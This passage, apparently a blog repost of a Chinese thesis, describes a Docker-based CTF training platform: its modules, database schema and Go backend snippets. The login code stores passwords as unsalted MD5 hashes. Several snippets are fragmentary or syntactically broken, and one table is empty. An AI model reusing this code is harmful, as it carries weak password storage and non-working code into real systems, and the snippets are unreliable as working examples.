src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps5.png" style="zoom:60%;" /><center>图3-3 登录注册模块流程图</center>### 3.2.2 管理员功能模块<p>（1）发布公告功能</p><p>​系统使用wangeditor框架的富文本模块进行开发，并且支持代码高亮，字体格式编辑，插入表格，背景色等功能。管理员发布公告后，将会将数据存入数据库Notices表中，并将公告展示在主页中。</p><p>（2）文章管理</p><p>​管理员可以对平台的文章进行搜索、查看、修改、删除等操作。当用户上传文章后，管理员查看用户上传的文章，选择是否发布该文章，并可以设置推荐文章。当文章被设置为推荐文章后，将在平台主页进行展示。文章管理模块的流程如图3-4所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps6.png" style="zoom: 80%;" /><center>图3-4 文章发布流程图</center>​题目管理：管理员端的题目管理包括题目上传及题目管理两部分，题目上传，暨上传题目到实验平台，题目管理可以查看平台目前已有的所有题目信息，并对其修改，删除。由于练习场中部分题目涉及容器模块，题目管理下还包括容器管理部分。由于云服务器依旧空间有限，管理员可以在必要时强行关闭客户开启的靶机容器。题目部署流程如图3-5所示。<img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps7.png" style="zoom:80%;" /><center>图3-5 题目部署流程图</center>​用户管理：管理员可以对用户信息进行操作，包括修改用户信息，重置密码，将用户从数据库中删除等操作，当管理员发现用户积分异常变化时，可以将用户成绩在成绩排行榜中屏蔽。<h3 id="3-2-3-用户功能">3.2.3 用户功能</h3><p>​个人信息：用户可以通过个人中心查看、修改个人信息及密码。同时平台统计的各种信息也会展示在用户个人信息中，包括用户知识结构等内容。</p><p>​文章功能：个人用户和管理员用户均可以发布文章。普通用户发布的文章会直接存入数据库中，但是只有经过管理员审核后批准的才会展示在主页。同时个人用户可以通过个人中心查看自己发布的文章并对其进行修改。在文章模块中用户可以通过关键字进行搜索查看带有该关键字的文章。</p><h3 id="3-2-4-练习场及题目设计">3.2.4 练习场及题目设计</h3><p>​主要题目类型包含Web 网络安全、Re 逆向工程、Pwn 二进制漏洞利用、Crypto密码攻击、Mobile 移动安全以及Misc安全杂项等^[10]^，这些内容暨GB/T 42446-2023中K01-003网络安全基础知识及K05-003网络安全威胁和漏洞管理，K05-005渗透测试技术与方法，K05-006网络攻防技术等知识^[11]^。</p><p>​在本实验平台中，练习场题目分为两种类型，附件型和容器型，附件型题目包括逆向工程、安全杂项、密码学、移动安全等，容器型包括二进制安全和Web安全。用户可以在练习场中进行实验操作，在附件型题目中，用户需要下载附件并在本地解答题目，得到题目Flag之后提交到平台进行验证。在容器型题目中，用户需要申请实验容器、在下发的容器地址中得到题目答案，通过平台提交答案及解题思路等。练习场解题流程如图3-6所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps8.png" alt="img"></p><center>图3-6 解题流程图</center>​逆向工程Re和二进制安全Pwn两种题目，这两类题目考察参赛者发现和利用软件漏洞的能力。需要解题者具备一定的编程能力和软件测试能力。解题者通过反编译技术将应用程序恢复为伪代码形式，在此基础上分析程序的行为，包括函数逻辑和数据处理流程。以求找到程序中隐藏的漏洞并对其进行利用，来获取必要的系统权限或者窃取敏感信息。<p>​移动安全Mobile是近期备受关注的一个领域，涉及到移动应用程序的安全漏洞甚至移动端系统层漏洞及相应攻防技术。这一类题目可以被视为是逆向工程和二进制安全在移动平台上综合应用。在这类CTF赛题中包括了Android和iOS等平台上的应用程序分析、反编译、漏洞利用等内容。参赛者需要了解移动应用程序的工作原理、移动系统的工作原理以及常见的安全漏洞，并能够对其进行复现和利用。</p><p>​Crypto密码攻击起源于密码学的密码编码学与密码分析学的实际应用，是网络安全领域中的重要分支，涉及到密码学的理论和实践。CTF赛题中的密码学题目包括了从古典密码到非对称加密、国密算法等多个方面的内容，参与者需要运用数学知识和密码学算法来破解加密算法并解密密文。</p><p>​安全杂项Misc，涵盖了各种与安全相关的各种内容，如电子取证、网络协议分析、社会工程学攻击、隐写术等。网络安全题目类别图如图3-7所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps9.jpg" style="zoom: 80%;" /><center>图3-7 网络安全题目分类</center>#### 3.3 数据库设计<h5 id="3-3-1-概念结构设计">3.3.1 概念结构设计</h5><p>​通过系统的需求分析，进行数据抽象，抽象出用户实体、文章实体、题目实体、公告实体、镜像实体和容器实体等六个实体。</p><p>​文章实体的属性包括文章ID、文章标题、文章类型、文章内容、作者、创建时间和浏览量等，文章实体的E-R图如图3-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps10.png" style="zoom:80%;" /><center>图3-8 文章实体E-R图</center>​用户实体的属性包括用户ID、账号、邮箱、昵称、密码、积分、签名、创建时间、更新时间和权限等，用户实体的E-R图如图3-9所示。<p>​题目实体的属性包括题目ID、问题名、问题描述、问题类型、分值、问题提示、答案、创建时间、更新时间动态答案标志和题目首通用户等，题目实体的E-R图如图3-10所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps11.png" alt="img"></p><center>图3-9 用户实体E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps12.png" style="zoom:80%;" /><center>图3-10 题目实体E-R图</center>​公告实体的属性包括公告ID、标题、作者、公告内容、创建时间和更新时间等，公告实体的E-R图如图3-11所示。<img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps13.png" style="zoom:80%;" /><center>图3-11 公告实体 E-R图</center>​镜像实体的属性包括镜像ID、仓库名称、创建时间和更新时间等，镜像实体的E-R图如图3-12所示。<p>​容器实体的属性包括容器ID、容器名称、容器状态、仓库名称、启动端口、映像端口、剩余时间、创建时间和更新时间等，镜像实体的E-R图如图3-13所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps14.png" style="zoom:80%;" /><center>图3-12 镜像实体 E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps15.png" style="zoom: 80%;" /><center>图3-13 容器实体E-R图</center>​用户发布文章和公告，为一对多的联系，同时用户解答题目为多对多的联系。在部分设计镜像的题目中，系统会由题目的附件构建Docker Image，题目与镜像为一对一的联系。通过一个镜像可以构建多个容器，表现为一对多的联系。数据库全局E-R图如图3-14所示<p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps16.png" alt=""></p><center>图3-14 数据库全局E-R图</center>### 3.3.2 逻辑结构设计<p>​在逻辑结构设计中，将概念结构设计阶段得到的E-R图转换为关系模式，本系统转换的各关系模式如下。</p><p><strong>（1）用户关系 Computer_Users</strong></p><p>​用户关系Computer_Users主要存放了系统用户的相关信息，其中id为主键。系统用户包括管理员用户和普通用户，使用Permissions位区分两类用户，Permissions值为1表示为管理员，0位普通用户。Password中并未存放实际用户密码，而是存放密码经过加密后的散列值，详情如表3-1所示。</p><center>表3-1 用户数据表 Computer_Users </center>| 列名         | 数据类型      | null | 默认 | 说明               || ------------ | ------------- | ---- | ---- | ------------------ || id           | int           | 否   |      | 主键，用于区分用户 || Number       | varchar (255) | 否   |      | 账号               || Email        | varchar (25)  | 否   |      | 邮箱               || Nick_Name    | varchar (25)  | 是   |      | 昵称               || Password     | varchar (255) | 否   |      | 密码               || Autograph    | varchar (255) | 是   | 0    | 签名               || Integral     | int           | 否   |      | 积分               || Create_Time  | datetime      | 否   |      | 创建时间           || Updated_Time | datetime      | 是   | 0    | 更新时间           |<p><strong>（2）题目关系 Problems</strong></p><p>​题目关系Problem主要用来存放题目信息，其中包括题目序号、名称、正确答案、问题通过次数、问题提交次数等信息。其中ID是本表的主键。Problem_A_Blood_Id为题目首通用户ID，同时用来标识题目是否有人通过和首通用户。Flag_Bool为题目动态答案标志，默认为0，即固定答案，当Flag_Bool为1表示为动态答案。详细信息如表3-2所示。</p><center>表3-2 题目信息表 Problems</center>| 列名               | 数据类型      | null | 默认             | 说明               || ------------------ | ------------- | ---- | ---------------- | ------------------ || id                 | int           | 否   |                  | 主键，用于区分题目 || Problem_Name       | varchar (255) | 否   |                  | 问题名             || Describe           | varchar (255) | 否   |                  | 问题描述           || Problem_Type       | varchar (255) | 否   | 200              | 问题类型           || Score              | varchar (255) | 是   |                  | 分值               || Tips               | varchar (255) | 是   |                  | 问题提示           || Answer             | varchar (255) | 否   |                  | 答案               || Problem_A_Blood_Id | varchar (255) | 否   | 0                | 题目首通用户ID     || Flag_Bool          | varchar (255) | 是   | flag{xxxxxxxxxx} | 动态答案标志       || Create_Time        | datetime      | 否   |                  | 创建时间           || Updated_Time       | datetime      | 是   |                  | 更新时间           |<p>（3）公告关系 Notices</p><p>​公告关系Notices主要用来存放公告信息，其中包括公告和其内容。其中序号ID是本表的主键。由于使用了Wangeditor框架开发，通过json流将带有标签和样式的信息存入Content中。其中序号ID是本表的主键。其详细信息如表3-3所示。</p><center>表3-3 公告信息表 Notices</center>| 列名         | 数据类型     | null | 默认  | 说明               || ------------ | ------------ | ---- | ----- | ------------------ || id           | int          | 否   |       | 主键，用于区分公告 || Title        | varchar (25) | 否   | Admin | 公共名             || Author       | varchar (25) | 是   |       | 作者               || Content      | text         | 否   |       | 内容               || Create_Time  | datetime     | 否   |       | 创建时间           || Updated_Time | datetime     | 是   |       | 更新时间           || User_ID      | int          | 否   |       | 用户ID，外键       |<p>（4）文章关系 Articles</p><p>​文章关系 Articles用来存放文章信息，包括文章的标题、文章类型、作者、内容等信息，其中序号ID是本表的主键。借助Wangeditor框架通过json流将带有标签和样式的信息存入Content中。Recommend的值初始为0为对应文章的浏览量。详细信息如表3-4所示。</p><center>表3-4 文章信息表 Articles</center>| 列名      | 数据类型      | null | 默认 | 说明               || --------- | ------------- | ---- | ---- | ------------------ || id        | int           | 否   |      | 主键，用于识别文章 || Title     | varchar (255) | 否   |      | 标题               || News_Type | varchar (25)  | 是   |      | 文章类型           || Author    | varchar (25)  | 是   |      | 作者               || Content   | text          | 是   |      | 文章内容           || Time      | datetime      | 否   | 0    | 创建时间           || Recommend | int           | 是   |      | 浏览量             || User_ID   | int           | 否   |      | 用户ID，外键       |<p>（5）解题关系 Submit_Problems</p><p>​解题信息表 Submit_Problems主要用来存放解题记录。其中序号ID是本表的主键，通过User_ID在Computer_Users表中唯一确定一个用户，Problem_ID绑定Problems中的Display，实现唯一对应一道题目，实现用户解题历史的记录。Problem_Submit_Number为提交次数，Problem_Pass为验证，默认为0表示题目还未通过，当值为1时即用户解题成功。通过对表中各条记录的统计可以得到对应题目的提交次数与通过次数。其详细信息如表3-5所示。</p><center>表3-5 解题信息表 Submit_Problems</center>| 列名                  | 数据类型      | null | 默认 | 说明         || --------------------- | ------------- | ---- | ---- | ------------ || id                    | int           | 否   |      | 主键，自增   || User_Id               | int           | 否   |      | 用户ID，外键 || Problem_Id            | int           | 否   |      | 题目ID，外键 || Problem_Submit_Number | varchar (255) | 否   | 1    | 提交次数     || Problem_Pass          | varchar (255) | 否   | 0    | 是否通过     || Create_Time           | datetime      | 否   |      | 创建时间     || Updated_Time          | datetime      | 是   |      | 更新时间     |<p>（6）镜像关系 Image</p><p>​镜像信息表Image用于存放服务器中的镜像信息，id为其主键，Image_Id为镜像的id，Repository为仓库名称，使用组合式写法即Repository:Tag形式，Problem_Id负责与对应题目绑定。</p><center>表3-6 镜像信息表 Image</center>| 列名         | 数据类型      | null | 默认 | 说明         || ------------ | ------------- | ---- | ---- | ------------ || Image_Id     | int           | 否   |      | 镜像ID       || Repository   | varchar (255) | 否   |      | 仓库名称     || Create_Time  | datetime      | 否   |      | 创建时间     || Updated_Time | datetime      | 是   |      | 更新时间     || Problem_Id   | int           | 否   |      | 题目ID，外键 |<p>（7）容器关系 Docker_information</p><p>​容器关系Docker_information主要用于存放当前启动的容器的相关信息，Docker_ID为主键。Container_Port为服务器对外开放的端口，Port为容器开放端口，实际是要将容器的80端口映射到服务器对外开放的端口上。Container_Status，为容器状态，0表示容器停止，1表示容器正在启动，2为未知状态。Repository为仓库名称，使用组合式写法即Repository:Tag形式，Remaining_time为容器剩余时间，默认为60分钟，用户延时后剩余时间会对应增加。容器信息表详细信息如表3-7所示。</p><center>表3-7 容器信息表 Docker_information</center>| 列名 | 数据类型 | null | 默认 | 说明 || ---- | -------- | ---- | ---- | ---- ||      |          |      |      |      |<h3 id="4-系统实现">4 系统实现</h3><h4 id="4-1-系统登录与注册模块实现">4.1 系统登录与注册模块实现</h4><h5 id="4-1-1-用户登录模块实现">4.1.1 用户登录模块实现</h5><p>​平台在用户没有登录时大部分功能无法正常使用。当点击Header栏登录按钮，会打开登录界面。输入账号并点击继续后，系统会检查账号是否存在。不存在则跳转注册页面，存在则输入密码并在后端进行验证。如果数据库中存在相应用户信息，且密码准确，将登录进入主界面，反之将出现密码错误的弹窗。登录页面如图4-1所示。</p><p>关键代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> Innumber <span class="token punctuation">(</span>db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB<span class="token punctuation">,</span> str <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> user model<span class="token punctuation">.</span> ComputerUser  db<span class="token punctuation">.</span> Where <span class="token punctuation">(</span><span class="token string">"number=?"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span> Number<span class="token punctuation">)</span><span class="token operator">!</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> Check <span class="token punctuation">(</span>content<span class="token punctuation">,</span> encrypted <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> strings<span class="token punctuation">.</span> EqualFold <span class="token punctuation">(</span><span class="token function">Encode</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> Encode <span class="token punctuation">(</span>data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  h<span class="token punctuation">:</span> <span class="token operator">=</span> md5<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  h<span class="token punctuation">.</span> Write <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">byte</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> hex<span class="token punctuation">.</span> EncodeToString <span class="token punctuation">(</span>h<span class="token punctuation">.</span> <span class="token function">Sum</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps17.jpg" style="zoom:80%;" /><center>图4-1系统登录界面</center>##### 4.1.2 注册页面实现<p>​当点击注册按钮，将跳转到注册页面，通过平台注册界面注册的用户，其Computer_Users表中的Permissions值均为0，为普通用户。对输入数据前端及后端均会进行验证，避免平台数据库受到攻击。用户注册模块页面如图4-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps18.jpg" style="zoom:80%;" /><center>图4-2 用户注册界面</center>用户关键代码如下：<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> Register <span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  json<span class="token punctuation">:</span> <span class="token operator">=</span> Username <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  c<span class="token punctuation">.</span><span class="token function">BindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>json<span class="token punctuation">)</span>  md<span class="token punctuation">:</span> <span class="token operator">=</span> Encode <span class="token punctuation">(</span>json<span class="token punctuation">.</span> Password<span class="token punctuation">)</span>  DB<span class="token punctuation">.</span> <span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>newUser<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-用户功能模块实现">4.2 用户功能模块实现</h4><p>​用户登录后的主页如下图所示，前台会展示管理员选择推荐的文章，和管理员发布的公告。同时用户可以通过主页访问练习场模块和排行榜模块。点击左上角的头像按钮将弹出下拉菜单，普通用户可以由此进入个人中心和文章模块。管理员用户的下拉菜单有所不同，其下拉菜单中包含后台选项，管理员用户可以由此进入系统后台。平台为保证用户有能力解决网络安全相关题目，用户可以通过其他中的访问平台搜集的各种在线工具和资源下载途径。用户主页界面如图4-3所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps19.jpg" style="zoom: 80%;" /><center>图4-3用户主页界面</center>##### 4.2.1 练习场模块的实现<p>​此模块在未登录时仅显示题目列表，用户点击不会触发点击事件，无法解答题目，用户在登录后才可以正常解答题目。当用户进入练习场后，可以通过左侧菜单栏按照类别题目类型，右侧会动态展示相应类型的题目。用户点击进入想要解答的题目，之后按照题目要求选择下发靶机环境或者下载附件。当解答完成后，用户将从附件或容器中获取到Flag提交，如果结果正确将显示提交正确，并为账号添加相应题目的分值。在用户不再尝试解题时可以点击按钮关闭当前已下发的靶场环境，后台会自动强制关闭该题目对应容器。题目列表会显示题目的通过人数和提交次数。用户解题成功后会使用红色标注，对于已通过的题目再次解题将不再得分。页面具体展示如图4-4所示。</p><p>​对于需要启动Docker的题目其流程如下所示：点击下发容器后，系统后台会下发相应容器，容器有一定运行时间限制。当容器运行时间结束时，会提示是否进行延时，如果不进行延时，系统会自动回收Docker容器，如果选择延时，系统将会延长Docker容器的运行时间。同时一个用户只能同时启动一个容器，如果需要启动其他题目，则需要先点击销毁容器，系统会回收相应容器资源。完成解题后将获取到flag后提交，如果结果正确将显示提交正确，并为账号添加相应题目的分数，同时系统会销毁容器并回收相应资源。靶机启动前后如图4-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps20.jpg"  /> <center> 图4-4练习场界面</center><center><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps21.jpg"  /> <img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps22-1743418602816.jpg"  /><center><center>图4-5 Web题目启动前后对比图</center>​由于本地环境的限制，包括存储与计算资源、网络连接以及安全要求等方面的限制，将Docker容器放在本地并不现实。因此为满足平台不断变化需求的需要，更便捷地部署和管理Docker容器，选择将Dockerfile及由此经过构建并运行的Docker Container部署在云服务器上。<p>​本系统在实际实现的过程中将Docker相关内容部署到阿里云服务器上。当前端用户点击下发容器后，后端将相关操作发送给服务器，进而对Docker容器进行操作。容器的下发与回收如图4-6所示。</p><p><strong>容器创建的关键代码如下：</strong></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">CreateAndStartContainer</span><span class="token punctuation">(</span>g <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  createImage <span class="token operator">:=</span> request<span class="token punctuation">.</span>CreateImageRequest<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  err <span class="token operator">:=</span> g<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>createImage<span class="token punctuation">)</span>  data<span class="token punctuation">,</span> ok <span class="token operator">:=</span> util<span class="token punctuation">.</span><span class="token function">VerifyPermissions</span><span class="token punctuation">(</span>createImage<span class="token punctuation">.</span>Token<span class="token punctuation">,</span> g<span class="token punctuation">)</span>  uid<span class="token punctuation">,</span> exists <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token string">"uid"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>  username<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>  createImage<span class="token punctuation">.</span>UserId <span class="token operator">=</span> uid  createImage<span class="token punctuation">.</span>Username <span class="token operator">=</span> username  containerManager<span class="token punctuation">,</span> err <span class="token operator">:=</span> common<span class="token punctuation">.</span><span class="token function">NewContainerManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​在具体实现过程中，即通过前端点击触发后端接口进而通过云服务器创建容器，并将容器的80端口映射到服务器的开放端口。由于阿里云服务器自带防火墙，会隔绝外部访问，所以需要进行安全组管理，将接口池的30080端口到30880端口设置为测试端口，允许外部IP地址访问。在容器下发完成后，平台用户访问对应题目，即访问远程服务器开放端口。</p><center> <img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps23.png" style="zoom: 80%;" /></center><center>图4-6容器的下发与回收</center>##### 4.2.2 文章模块的实现<p>​用户端的文章模块，管理员和用户可以将自己认为有价值的内容上传，也可是上传平台题目解题思路，同时前台将进行展示。文章模块提供搜索功能，可以检索带有关键字的文章。文章模块如图4-7所示。</p><p>​同时文章模块可以根据Articles库中的id值，将存储在Articles表中的文章信息映射到对应的Article:id页面，进行展示。由于在文章发布模块使用WangEditor，通过json流将带有标签和样式的信息存入Content中。对应文章页面的实现过程与存入过程正好相反，通过json数据流读出数据库Content中的标签及样式信息，写入前端Vue文件中，并对其进行动态渲染，从而实现对应文章的展示。</p><p><strong>关键代码如下：</strong></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// FindArticle 查询文章</span><span class="token keyword">func</span> FindArticle <span class="token punctuation">(</span>f <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  title<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">:</span> <span class="token operator">=</span> f<span class="token punctuation">.</span> <span class="token function">GetQuery</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> cat <span class="token punctuation">[</span><span class="token punctuation">]</span> model<span class="token punctuation">.</span> Article  DB<span class="token punctuation">.</span> Where <span class="token punctuation">(</span><span class="token string">"title LIKE?"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token operator">+</span>title<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cat<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps24.jpg" style="zoom:80%;" /><center>图4-7文章模块实现</center>#### 4.3 管理员功能模块实现<p>​安全是“三分技术，七分管理”，网络安全实验平台的长期安全运营，也需要经过实践的检验。系统中管理员功能主要职责为维护网络安全实验平台的正常运行，主要实现信息发布，用户信息管理、文章管理、题目管理、容器管理等功能。</p><h5 id="4-3-1-用户信息管理的实现">4.3.1 用户信息管理的实现</h5><p>​在该系统后台中管理员不仅可以管理用户账号和用户信息，还能对用户的个人账户密码进行更改，从而保证了系统的正常运行。在特点情况下可以删除用户，如图4-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps25.jpg" style="zoom:80%;" /><center>图4-8用户信息管理页面</center>##### 4.3.2 文章管理模块的实现<p>​文章管理功能，包括文章信息管理和文章发布及公共发布，文章发布功能使用wangeditor框架的富文本模块进行开发，将管理员在前端输入内容与样式作为整体存入数据库，文章信息管理则与前面的用户信息管理内容相似。题目上传页面具体内容如图4-9所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps26.jpg" style="zoom:80%;" /><center>图4-9 题目上传页面</center>题目上传代码如下所示：<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> ProblemUpload <span class="token punctuation">(</span>p <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> Pr model<span class="token punctuation">.</span> Problem  DB<span class="token punctuation">.</span> Where <span class="token punctuation">(</span><span class="token string">"display=?"</span><span class="token punctuation">,</span> Display<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Pr<span class="token punctuation">)</span>  DB<span class="token punctuation">.</span> <span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>NewProblem<span class="token punctuation">)</span>  url<span class="token punctuation">:</span> <span class="token operator">=</span> “<span class="token punctuation">.</span> <span class="token operator">/</span>data<span class="token operator">/</span>file<span class="token operator">/</span><span class="token string">" + ProblemType + "</span><span class="token operator">/</span><span class="token string">"  err: = os. MkdirAll (url, os. ModePerm)  file, _: = p. FormFile("</span>file<span class="token string">")  fileStr: = file. Filename  for j: = len(fileStr); j > 0; j-- &#123;     if fileStr[j-1] == '.' &#123;       str: = fileStr[j:]         fe: = Display + "</span><span class="token punctuation">.</span>" <span class="token operator">+</span> str         p<span class="token punctuation">.</span> SaveUploadedFile <span class="token punctuation">(</span>file<span class="token punctuation">,</span> url<span class="token operator">+</span>fe<span class="token punctuation">)</span>         <span class="token keyword">return</span>     <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-3-3-题目管理模块的实现">4.3.3 题目管理模块的实现</h5><p>​题目管理功能，包括题目信息管理和题目上传，管理员通过设置Display ID作为题目的唯一标识符，设置题目类型，答案等信息，后端接收到前端传输的附件或者Dockerfile文件后会将其放在后端的对应位置，并将其根据Display ID进行更名。题目信息管理则与前面的用户信息管理内容相似。题目管理页面具体内容如图4-10所示。</p><p>​同时由于在Web和Pwn两种类型的题目中使用了Docker容器，管理员模块在题目管理下设一栏容器管理。在容器管理中会显示服务器中目前运行的Docker容器信息，包括容器的IP地址，所占空间，开启用户等。同时由于平台云服务器实际条件的限制，允许管理员可以在后台手动释放用户开启的容器。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps27.jpg" style="zoom:80%;" /><center>图4-10 题目管理页面</center>#### 4.4 排行榜及积分实现<p>用户在提交正确的Flag后，用户会获得当前题目的分值，该分值由题目初始分值和题目通过次数与解题次数共同决定。后端会将题目当前的分值添加给用户。排行榜通过统计用户获得的分数对用户进行排名，并将系统内前十的用户成绩展示，排名模块如图4-11所示。</p><p><img 